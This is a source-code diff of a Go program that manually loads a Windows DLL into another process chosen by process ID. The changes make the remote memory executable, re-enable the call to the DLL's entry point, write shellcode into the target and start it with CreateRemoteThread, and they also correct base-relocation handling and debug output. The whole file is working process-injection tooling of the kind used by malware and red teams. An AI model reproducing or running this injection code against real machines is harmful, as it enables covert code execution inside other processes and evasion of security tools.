@@ -1,6 +1,7 @@
 package main
 
 import (
+	"bufio"
 	"bytes"
 	"debug/pe"
 	"encoding/binary"
@@ -177,7 +178,7 @@ func MemoryLoadLibrary(PE []byte, pid int) error {
 
 	fmt.Printf("[+] Got remote process handle: %x\n", remoteProcess)
 
-	peInfo.WriteHandle, err = VirtualAllocEx(remoteProcess, 0, uintptr(peInfo.SizeOfImage), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
+	peInfo.WriteHandle, err = VirtualAllocEx(remoteProcess, 0, uintptr(peInfo.SizeOfImage), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
 	if err != nil {
 		return err
 	}
@@ -207,10 +208,10 @@ func MemoryLoadLibrary(PE []byte, pid int) error {
 
 	fmt.Printf("[+] Entry point %x\n", entry)
 
-	// err = CallDLLMain(peInfo.WriteHandle, entry, uintptr(remoteProcess))
-	// if err != nil {
-	// 	return err
-	// }
+	err = CallDLLMain(peInfo.WriteHandle, entry, uintptr(remoteProcess))
+	if err != nil {
+		return err
+	}
 
 	return windows.CloseHandle(remoteProcess)
 
@@ -224,7 +225,6 @@ type BaseReloc struct {
 type Reloc uint16
 
 func RebaseImage(local_image []byte, peInfo PEInfo) error {
-	fmt.Println("Base reloc size: ", peInfo.BaseRelocationTable.Size)
 
 	var relocsSection *pe.Section
 	for i := range peInfo.Sections {
@@ -236,7 +236,10 @@ func RebaseImage(local_image []byte, peInfo PEInfo) error {
 
 	delta := peInfo.WriteHandle - uintptr(peInfo.OriginalImageBase)
 
+	fmt.Printf("New base: %x, Old base: %x, Delta: %d\n", peInfo.WriteHandle, peInfo.OriginalImageBase, delta)
+
 	sectionReader := relocsSection.Open()
+
 	for {
 		var reloc BaseReloc
 		err := binary.Read(sectionReader, binary.LittleEndian, &reloc)
@@ -245,7 +248,6 @@ func RebaseImage(local_image []byte, peInfo PEInfo) error {
 		}
 
 		count := (reloc.SizeOfBlock - 8) / 2
-		fmt.Println("[+] Block", reloc.VirtualAddress, " size ", reloc.SizeOfBlock, "count", count)
 
 		for i := uint32(0); i < count; i++ {
 
@@ -255,18 +257,24 @@ func RebaseImage(local_image []byte, peInfo PEInfo) error {
 				break
 			}
 
-			fmt.Println("\t[+] reloc ", r)
-			//t := r >> 12
-			offset := r & Reloc(0xFFF)
+			t := r >> 12
+			offset := r & Reloc(0x0FFF)
 
-			if r&IMAGE_REL_BASED_DIR64 > 0 {
-				newAddr := binary.LittleEndian.Uint64(local_image[reloc.VirtualAddress+uint32(offset):]) + uint64(delta)
+			fmt.Print("offset: ", offset, " address: ", reloc.VirtualAddress)
+			switch t {
+			case IMAGE_REL_BASED_DIR64:
 
-				binary.LittleEndian.PutUint64(local_image[reloc.VirtualAddress+uint32(offset):], newAddr)
-			} else if r&IMAGE_REL_BASED_HIGHLOW > 0 {
-				newAddr := binary.LittleEndian.Uint32(local_image[reloc.VirtualAddress+uint32(offset):]) + uint32(delta)
+				orgAddress := binary.LittleEndian.Uint64(local_image[reloc.VirtualAddress+uint32(offset):])
+				fmt.Println(", org address: ", orgAddress, " result: ", orgAddress+uint64(delta))
+				binary.LittleEndian.PutUint64(local_image[reloc.VirtualAddress+uint32(offset):], orgAddress+uint64(delta))
+			case IMAGE_REL_BASED_HIGHLOW:
 
-				binary.LittleEndian.PutUint32(local_image[reloc.VirtualAddress+uint32(offset):], newAddr)
+				orgAddress := binary.LittleEndian.Uint32(local_image[reloc.VirtualAddress+uint32(offset):])
+				fmt.Println(", org address: ", orgAddress, " result: ", orgAddress+uint32(delta))
+
+				binary.LittleEndian.PutUint32(local_image[reloc.VirtualAddress+uint32(offset):], orgAddress+uint32(delta))
+			default:
+
 			}
 
 		}
@@ -305,12 +313,14 @@ func CallDLLMain(remoteAddr uintptr, entry uintptr, processHandle uintptr) error
 		return err
 	}
 
+	fmt.Printf("ShellCode addr: %x\n", shellCodeWriteHandle)
+
 	_, err = WriteProcessMemory(windows.Handle(processHandle), shellCodeWriteHandle, shellcode)
 
 	if err != nil {
 		return err
 	}
-
+	bufio.NewReader(os.Stdin).ReadBytes('\n')
 	threadHandle, _, err := CreateRemoteThread(syscall.Handle(processHandle), nil, 0, shellCodeWriteHandle, 0, 0)
 	if err != nil {
 		return err
@@ -339,11 +349,7 @@ func CopySections(peInfo PEInfo, PEBytes []byte) ([]byte, error) {
 			sectionData = sectionData[:section.VirtualSize]
 		}
 
-		if len(sectionData) > 0 {
-			fmt.Println("["+section.Name+"] va: ", section.VirtualAddress, "size: ", section.Size, "30 bytes: ", sectionData[:30])
-		} else {
-			fmt.Println("["+section.Name+"] empty, va", section.VirtualAddress)
-		}
+		fmt.Println("["+section.Name+"] va: ", section.VirtualAddress)
 
 		if sectionData != nil {
 			n := copy(fullData[destAddr:], sectionData)
